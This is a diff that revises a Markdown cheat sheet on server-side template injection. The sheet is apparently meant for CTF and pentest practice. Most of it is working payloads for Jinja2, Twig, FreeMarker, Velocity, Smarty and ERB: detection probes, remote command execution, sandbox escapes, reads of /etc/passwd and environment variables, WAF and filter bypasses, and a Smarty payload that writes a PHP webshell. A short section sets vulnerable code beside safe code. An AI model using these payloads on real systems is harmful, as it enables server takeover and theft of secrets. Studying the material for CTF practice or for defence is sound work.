@@ -1,72 +1,55 @@
 # Server-Side Template Injection (SSTI) - Basics
 
+## Quick Reference
+
+| Engine | Language | Detection | RCE Payload |
+|--------|----------|-----------|-------------|
+| Jinja2 | Python | `{{7*'7'}}` → `7777777` | `{{cycler.__init__.__globals__.os.popen('id').read()}}` |
+| Twig | PHP | `{{7*'7'}}` → `7777777` | `{{['id']\|filter('system')}}` |
+| FreeMarker | Java | `${7*7}` → `49` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
+| Velocity | Java | `#set($x=7*7)$x` → `49` | `#set($rt=$class.forName('java.lang.Runtime').getRuntime())` |
+| Smarty | PHP | `{7*7}` → `49` | `{system('id')}` |
+| ERB | Ruby | `<%= 7*7 %>` → `49` | `<%= system('id') %>` |
+
+**Quick Detection Probes:**
+```
+{{7*7}}        → Jinja2 / Twig / Handlebars
+${7*7}         → FreeMarker / EJS
+<%= 7*7 %>     → ERB
+#set($x=7*7)$x → Velocity
+{7*7}          → Smarty
+```
+
+---
+
 ## What is SSTI?
 
-Server-Side Template Injection occurs when user input is embedded into a template in an unsafe way, allowing attackers to inject template directives and execute arbitrary code on the server.
+Server-Side Template Injection occurs when user input is embedded into a template string **before** rendering, allowing attackers to inject template directives and execute arbitrary code on the server.
 
-**Key Impact**:
-- Remote Code Execution (RCE)
-- Read arbitrary files
-- Access to internal application data
-- Full server compromise
+**Impact:**
+- 🔓 Remote Code Execution (RCE) on the server
+- 📂 Read arbitrary files (e.g., `/etc/passwd`, `/flag.txt`)
+- 🔑 Access internal app config, secrets, and env variables
+- 💀 Full server compromise
 
----
-
-## How SSTI Works
-
-### Normal Template Usage
+**Vulnerable vs Safe:**
 ```python
-# Safe - data is passed as context
+# ✅ SAFE — user input passed as context variable
 template = "Hello {{username}}"
-render(template, {"username": "John"})
-# Output: Hello John
-```
+render(template, {"username": user_input})
 
-### SSTI Vulnerability
-```python
-# Unsafe - user input embedded in template
+# ❌ VULNERABLE — user input embedded into the template string
 template = f"Hello {user_input}"
 render(template)
-# User input: {{7*7}}
-# Output: Hello 49
+# Input: {{7*7}} → Output: Hello 49
 ```
 
 ---
 
-## Common Template Engines
+## Detection Methodology
 
-### Python
-- **Jinja2** (Flask, Django)
-- **Mako**
-- **Tornado**
-- **Django Templates**
-
-### Java
-- **Freemarker**
-- **Velocity**
-- **Thymeleaf**
-
-### JavaScript
-- **Pug** (formerly Jade)
-- **Handlebars**
-- **EJS**
-- **Nunjucks**
-
-### Ruby
-- **ERB** (Embedded Ruby)
-- **Slim**
-- **Haml**
-
-### PHP
-- **Twig**
-- **Smarty**
-- **Blade** (Laravel)
-
----
-
-## Detection
-
-### Step 1: Test with Mathematical Expressions
+### Step 1: Probe with Math Expressions
+Send these payloads in every user-controlled input field:
 ```
 {{7*7}}
 ${7*7}
@@ -74,84 +57,87 @@ ${7*7}
 ${{7*7}}
 #{7*7}
 *{7*7}
+#set($x=7*7)$x
 ```
+- **Vulnerable:** response contains `49`
+- **Not vulnerable:** literal string echoed back
 
-**Expected results**:
-- Vulnerable: `49`
-- Not vulnerable: `{{7*7}}` (literal output)
-
-### Step 2: Template-Specific Syntax
-```
-# Jinja2/Twig
-{{7*'7'}}  → 7777777
-
-# FreeMarker
-${7*7}  → 49
-
-# Velocity
-#set($x=7*7)$x  → 49
-
-# Smarty
-{7*7}  → 49
-
-# ERB
-<%= 7*7 %>  → 49
-```
-
-### Step 3: Identify Template Engine
-Use polyglot payloads that work differently across engines:
+### Step 2: Fingerprint the Engine
+Use the multiplication trick — different engines handle `7*'7'` differently:
 ```
 {{7*'7'}}
 ```
-- Jinja2: `7777777`
-- Twig: `7777777`
-- Mako: `7777777`
-- Others: `49` or error
+- **Jinja2 / Twig / Mako:** `7777777`
+- **Others:** `49` or error
+
+### Step 3: Polyglot Payload
+Test multiple engines in a single shot:
+```
+${{<%[%'"}}%\
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+```
+
+### Step 4: Common Injection Points
+- 🔴 **URL params:** `GET /page?name={{7*7}}`
+- 🔴 **POST body:** `name={{7*7}}&email=test@test.com`
+- 🔴 **HTTP headers:** `User-Agent: {{7*7}}`
+- 🔴 **Form fields, email templates, error messages**
 
 ---
 
-## Basic Exploitation by Engine
+## Jinja2 Exploitation (Python / Flask)
 
-### Jinja2 (Python/Flask)
-
-#### Detection
-```
-{{7*7}}  → 49
-{{7*'7'}}  → 7777777
-```
-
-#### File Read
+**Detection:**
 ```python
-{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{7*7}}      → 49
+{{7*'7'}}    → 7777777
 ```
 
-#### RCE - Method 1 (subprocess)
+**RCE — Method 1 (builtins import):**
 ```python
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 
-#### RCE - Method 2 (using config)
+**RCE — Method 2 (config globals):**
 ```python
-{{ config.items() }}
 {{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
 ```
 
-#### RCE - Method 3 (cycler)
+**RCE — Method 3 (cycler — clean & short):**
 ```python
 {{ cycler.__init__.__globals__.os.popen('id').read() }}
 ```
 
+**RCE — Method 4 (lipsum):**
+```python
+{{ lipsum.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+
+**File Read:**
+```python
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+```
+
+**Info Dump:**
+```python
+{{ config }}
+{{ config.items() }}
+{{ self.__dict__ }}
+```
+
 ---
 
-### Twig (PHP/Symfony)
+## Twig Exploitation (PHP / Symfony)
 
-#### Detection
+**Detection:**
 ```
-{{7*7}}  → 49
+{{7*7}}    → 49
 {{7*'7'}}  → 7777777
 ```
 
-#### RCE
+**RCE:**
 ```php
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
 
@@ -162,16 +148,19 @@ Use polyglot payloads that work differently across engines:
 {{['cat /etc/passwd']|filter('system')}}
 ```
 
+**Info Dump:**
+```php
+{{ dump(app) }}
+{{ dump(_self) }}
+```
+
 ---
 
-### FreeMarker (Java)
+## FreeMarker & Velocity Exploitation (Java)
 
-#### Detection
-```
-${7*7}  → 49
-```
+**FreeMarker Detection:** `${7*7}` → `49`
 
-#### RCE
+**FreeMarker RCE:**
 ```java
 <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
 
@@ -184,16 +173,9 @@ ${7*7}  → 49
 ${dwf.newInstance(ec,null)("id")}
 ```
 
----
+**Velocity Detection:** `#set($x=7*7)$x` → `49`
 
-### Velocity (Java)
-
-#### Detection
-```
-#set($x=7*7)$x  → 49
-```
-
-#### RCE
+**Velocity RCE:**
 ```java
 #set($runtime = $class.forName('java.lang.Runtime').getRuntime())
 #set($process = $runtime.exec('id'))
@@ -206,30 +188,20 @@ $null.read()
 
 ---
 
-### Smarty (PHP)
+## Smarty & ERB Exploitation
 
-#### Detection
-```
-{7*7}  → 49
-```
+**Smarty (PHP) Detection:** `{7*7}` → `49`
 
-#### RCE
+**Smarty RCE:**
 ```php
 {system('id')}
 {php}system('id');{/php}
 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['c']); ?>",self::clearConfig())}
 ```
 
----
+**ERB (Ruby) Detection:** `<%= 7*7 %>` → `49`
 
-### ERB (Ruby)
-
-#### Detection
-```
-<%= 7*7 %>  → 49
-```
-
-#### RCE
+**ERB RCE:**
 ```ruby
 <%= system('id') %>
 <%= `id` %>
@@ -239,184 +211,121 @@ $null.read()
 
 ---
 
-## Polyglot Detection Payloads
+## Jinja2 Sandbox Escapes & Filter Bypasses
 
-Test multiple engines at once:
-```
-${{<%[%'"}}%\
-{{7*7}}
-${7*7}
-<%= 7*7 %>
-${{7*7}}
-#{7*7}
-#{ 7*7 }
-```
-
----
-
-## Common SSTI Locations
-
-### 1. URL Parameters
-```
-GET /page?name={{7*7}}
-GET /greet?message=${7*7}
-```
-
-### 2. POST Body
-```
-POST /contact
-name={{7*7}}&email=test@test.com
-```
-
-### 3. HTTP Headers
-```
-User-Agent: {{7*7}}
-Referer: ${7*7}
-```
-
-### 4. Form Fields
-```html
-<form>
-  <input name="username" value="{{7*7}}">
-</form>
-```
-
-### 5. Email Templates
-```
-Subject: Hello {{username}}
-Body: {{7*7}}
-```
-
-### 6. Error Messages
-```
-Template rendering error in: {{user_input}}
-```
-
----
-
-## Exploitation Techniques
-
-### 1. Information Disclosure
-
-#### Jinja2 - Dump Config
-```python
-{{ config }}
-{{ config.items() }}
-{{ self.__dict__ }}
-```
-
-#### Twig - Dump Environment
-```php
-{{ dump(app) }}
-{{ dump(_self) }}
-```
-
-### 2. File Read
-
-#### Jinja2
-```python
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
-```
-
-#### ERB
-```ruby
-<%= File.open('/etc/passwd').read %>
-```
-
-### 3. Remote Code Execution
-
-See engine-specific sections above.
-
----
-
-## Sandbox Escapes (Jinja2)
-
-### Method 1: Object Introspection
+**Sandbox Escape — Object Introspection:**
 ```python
 {{ ''.__class__.__mro__[1].__subclasses__() }}
 ```
 
-### Method 2: Accessing __builtins__
-```python
-{{ [].__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read() }}
-```
-
-### Method 3: Using request object
+**Sandbox Escape — via request object:**
 ```python
 {{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 
-### Method 4: Lipsum
+**Bypass `{{` and `}}`:**
 ```python
-{{ lipsum.__globals__.__builtins__.__import__('os').popen('id').read() }}
-```
-
-### Method 5: Cycler
-```python
-{{ cycler.__init__.__globals__.os.popen('id').read() }}
-```
-
----
-
-## Filter Bypasses
-
-### Bypass "{{" and "}}"
-```
 {%print(7*7)%}
 {% print 7*7 %}
 {%set x=7*7%}{{x}}
 ```
 
-### Bypass Quotes
+**Bypass Quotes:**
 ```python
-# Use chr() or request.args
-{{request.args.x}}  # Pass x=command via GET parameter
-{{''[request.args.x]}}  # x=__class__
-
-# Hex encoding
-{{"__cla"+"ss__"}}
+{{request.args.x}}          # Pass x=command via GET
+{{''[request.args.x]}}      # x=__class__
 ```
 
-### Bypass Dots
+**Bypass Dots:**
 ```python
-# Use [] notation
 {{''['__class__']}}
-{{''['__class__']['__mro__']}}
-
-# Use attr()
 {{''|attr('__class__')}}
 ```
 
-### Bypass Underscores
+**Bypass Underscores:**
 ```python
-# URL encode
 {{''['\x5f\x5fclass\x5f\x5f']}}
-
-# Use request.args
-{{request.args.x}}  # x=__class__
+{{request.args.x}}           # x=__class__
 ```
 
-### Bypass Keywords (import, os, etc.)
+**Bypass Keywords (import, os, etc.):**
 ```python
-# String concatenation
 {{"__im"+"port__"}}
 {{"o"+"s"}}
-
-# Use request.args
-{{request.args.cmd}}  # cmd=import
-
-# Base64 decode
-{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os').popen(request.args.cmd).read()}}
+{{request.args.cmd}}         # cmd=import
 ```
 
 ---
 
-## CTF-Specific Tips
+## Exploitation Workflow
 
-### 1. Look for Flag Files
+**Step 1:** Identify all user-controlled input points (GET/POST params, headers, cookies, form fields).
+
+**Step 2:** Inject basic math probes — `{{7*7}}`, `${7*7}}`, `<%= 7*7 %>` — and observe if `49` appears in the response.
+
+**Step 3:** Use `{{7*'7'}}` to distinguish Jinja2/Twig (`7777777`) from other engines (`49` or error).
+
+**Step 4:** Try to access Python/PHP/Java objects. If errors reveal stack traces, they confirm the engine and version.
+
+**Step 5:** Use engine-specific RCE payloads. Start with `id` or `whoami` to confirm code execution.
+
+**Step 6:** Escalate — read `/etc/passwd`, `/flag.txt`, env variables, or drop a webshell.
+
+---
+
+## Common Vulnerable Patterns
+
+**Pattern 1 — Python f-string in render:**
+```python
+# ❌ Vulnerable
+template = f"Hello {request.args.get('name')}"
+return render_template_string(template)
+
+# ✅ Safe
+return render_template_string("Hello {{name}}", name=request.args.get('name'))
+```
+
+**Pattern 2 — PHP string concatenation into Twig:**
+```php
+// ❌ Vulnerable
+$template = "Hello " . $_GET['name'];
+echo $twig->createTemplate($template)->render([]);
+
+// ✅ Safe
+echo $twig->render("Hello {{ name }}", ['name' => $_GET['name']]);
+```
+
+**Pattern 3 — Java FreeMarker with raw input:**
+```java
+// ❌ Vulnerable
+String template = "Hello " + userInput;
+new Template("t", template, cfg).process(data, out);
+```
+
+**Pattern 4 — Ruby ERB with direct interpolation:**
+```ruby
+# ❌ Vulnerable
+template = ERB.new("Hello #{params[:name]}")
+template.result(binding)
+```
+
+---
+
+## CTF / Practical Tips
+
+**Quick Tests — try these first:**
+```python
+{{7*7}}
+{{7*'7'}}
+{{config}}
+{{self}}
+```
+
+**Flag File Reads:**
 ```python
 # Jinja2
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/flag.txt').read() }}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}
 
 # ERB
 <%= File.open('/flag.txt').read %>
@@ -425,7 +334,7 @@ See engine-specific sections above.
 {{['cat /flag.txt']|filter('system')}}
 ```
 
-### 2. Check Environment Variables
+**Check Environment Variables:**
 ```python
 # Jinja2
 {{ self.__init__.__globals__.__builtins__.__import__('os').environ }}
@@ -434,79 +343,35 @@ See engine-specific sections above.
 <%= ENV %>
 ```
 
-### 3. Execute Commands
+**List Files First:**
 ```python
 # Jinja2
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}
-
-# Twig
-{{['cat /flag.txt']|filter('system')}}
-
-# ERB
-<%= `cat /flag.txt` %>
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la /').read() }}
 ```
 
-### 4. List Files
-```python
-# Jinja2
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la').read() }}
-```
+**Common CTF Scenarios:**
+- ⚠️ Flag is in `/flag.txt`, `/flag`, or `/root/flag.txt`
+- ⚠️ Flag stored as an env variable — always check `os.environ`
+- ⚠️ WAF filtering `{{` — try `{%print(...)%}` or URL-encode brackets
+- ⚠️ Underscores filtered — use `\x5f` hex encoding or `request.args`
+- ⚠️ Index offsets for `__subclasses__()` change per Python version — iterate or search
+
+**Tools:**
+- **tplmap** — automated SSTI scanner and exploiter
+- **SSTImap** — modern alternative to tplmap
+- **Burp Suite Intruder** — fuzz all input points with polyglot payloads
+- **PayloadsAllTheThings** — comprehensive SSTI payload collection
 
 ---
 
-## Testing Methodology
+## Key Takeaways
 
-1. **Identify input points** - Where does user input appear in responses?
-2. **Test basic math** - `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
-3. **Identify template engine** - Use polyglot payloads
-4. **Test for sandbox** - Try to access classes/modules
-5. **Escalate to RCE** - Use engine-specific payloads
-6. **Extract flag** - Read files, execute commands, check environment
+✅ SSTI occurs when user input is **concatenated into** a template string, not passed as a variable context.
 
----
+✅ Always probe with `{{7*7}}` first — if you see `49`, the app is likely vulnerable.
 
-## Quick Reference
+✅ Use `{{7*'7'}}` to distinguish Jinja2/Twig (`7777777`) from other engines.
 
-### Detection
-```
-{{7*7}}
-${7*7}
-<%= 7*7 %>
-#{7*7}
-```
+✅ Jinja2's `cycler` and `lipsum` globals are the cleanest RCE vectors — short and reliable.
 
-### Jinja2 RCE
-```python
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
-```
-
-### Twig RCE
-```php
-{{['id']|filter('system')}}
-```
-
-### FreeMarker RCE
-```java
-<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
-```
-
-### ERB RCE
-```ruby
-<%= system('id') %>
-```
-
-### File Read (Jinja2)
-```python
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
-```
-
----
-
-## Tools
-
-- **tplmap**: Automated SSTI scanner and exploiter
-- **SSTImap**: Similar to tplmap
-- **Burp Suite**: Manual testing with Intruder
-- **PayloadsAllTheThings**: Comprehensive SSTI payload collection
-
-Next: Deep dive into each template engine with advanced exploitation techniques!
+✅ When filters block special chars, use `request.args` to pass payloads out-of-band and bypass WAFs.
